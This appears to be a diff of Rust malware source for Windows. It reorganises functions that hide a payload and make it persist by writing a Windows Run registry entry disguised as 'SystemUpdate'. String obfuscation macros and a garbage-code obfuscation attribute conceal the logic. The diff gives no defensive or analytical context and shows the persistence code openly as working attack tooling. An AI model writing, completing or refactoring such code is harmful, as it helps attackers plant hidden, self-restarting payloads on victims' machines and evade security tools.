@@ -34,12 +34,59 @@ unsafe fn add_to_startup(file_path: &str) -> Result<(), String> {
         .encode_wide()
         .chain(once(0))
         .collect();
+    let mut hkey = mem::MaybeUninit::uninit();
+
+    if RegOpenKeyExW(
+        HKEY_CURRENT_USER,
+        run_key_path.as_ptr(),
+        0,
+        KEY_SET_VALUE,
+        hkey.as_mut_ptr(),
+    ) != 0
+    {
+        return Err(obfuscate_string!("Failed to open registry key.").to_string());
+    }
+
+    let hkey = hkey.assume_init();
+    let app_name: Vec<u16> = OsStr::new("SystemUpdate")
+        .encode_wide()
+        .chain(once(0))
+        .collect();
+    let file_path_w: Vec<u16> = OsStr::new(file_path)
+        .encode_wide()
+        .chain(once(0))
+        .collect();
+
+    if RegSetValueExW(
+        hkey,
+        app_name.as_ptr(),
+        0,
+        REG_SZ,
+        file_path_w.as_ptr() as *const u8,
+        (file_path_w.len() * 2) as u32,
+    ) != 0
+    {
+        RegCloseKey(hkey);
+        return Err(obfuscate_string!("Failed to set registry value.").to_string());
+    }
+
+    RegCloseKey(hkey);
+    Ok(())
+}
+
+#[cfg(windows)]
+#[obfuscate(garbage = true)]
+pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), String> {
+    // First, check if persistence is already established.
+    let run_key_path: Vec<u16> = OsStr::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
+        .encode_wide()
+        .chain(once(0))
+        .collect();
     let app_name: Vec<u16> = OsStr::new("SystemUpdate")
         .encode_wide()
         .chain(once(0))
         .collect();
 
-    // Check if the startup entry already exists and points to a valid file
     let mut hkey_read = mem::MaybeUninit::uninit();
     if RegOpenKeyExW(
         HKEY_CURRENT_USER,
@@ -91,46 +138,7 @@ unsafe fn add_to_startup(file_path: &str) -> Result<(), String> {
         RegCloseKey(hkey_read);
     }
 
-    // If the check fails or the key doesn't exist, proceed to create it.
-    let mut hkey = mem::MaybeUninit::uninit();
-
-    if RegOpenKeyExW(
-        HKEY_CURRENT_USER,
-        run_key_path.as_ptr(),
-        0,
-        KEY_SET_VALUE,
-        hkey.as_mut_ptr(),
-    ) != 0
-    {
-        return Err(obfuscate_string!("Failed to open registry key.").to_string());
-    }
-
-    let hkey = hkey.assume_init();
-    let file_path_w: Vec<u16> = OsStr::new(file_path)
-        .encode_wide()
-        .chain(once(0))
-        .collect();
-
-    if RegSetValueExW(
-        hkey,
-        app_name.as_ptr(),
-        0,
-        REG_SZ,
-        file_path_w.as_ptr() as *const u8,
-        (file_path_w.len() * 2) as u32,
-    ) != 0
-    {
-        RegCloseKey(hkey);
-        return Err(obfuscate_string!("Failed to set registry value.").to_string());
-    }
-
-    RegCloseKey(hkey);
-    Ok(())
-}
-
-#[cfg(windows)]
-#[obfuscate(garbage = true)]
-pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), String> {
+    // If persistence is not found, proceed to create it.
     let mut program_data = match std::env::var(obfuscate_string!("ProgramData")) {
         Ok(s) => s,
         Err(_) => {
